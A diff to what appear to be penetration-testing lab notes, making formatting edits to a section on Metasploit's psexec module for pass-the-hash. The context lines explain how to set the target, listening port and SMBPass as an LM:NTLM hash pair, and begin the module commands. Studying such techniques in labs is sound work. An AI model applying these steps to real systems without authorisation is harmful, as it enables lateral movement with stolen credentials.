@@ -1332,7 +1332,7 @@ Since the command prompt was launched with administrator privileges, any subsequ
 - Get to root directory -> `cd /`
 - Navigate to a directory -> `C:\\Users\\Administrator\\Desktop`
 - List contents of a directory -> `dir`
-- Open contents of a txt file -> `cat <file_name>`
+- Open contents of a file -> `cat <file_name>`
 
 ---
 
@@ -1472,10 +1472,10 @@ The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash
 search psexec
 ```
 We need the `exploit/windows/smb/psexec` exploit. Configure the exploit module and payload options. Also, just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
-	- `RHOST` = Target IP
-	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
-	- `SMBDomain` = If connected to a domain
-	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
+- `RHOST` = Target IP
+- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
+- `SMBDomain` = If connected to a domain
+- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
 ```
 use exploit/windows/smb/psexec
 set SMBUser <user>
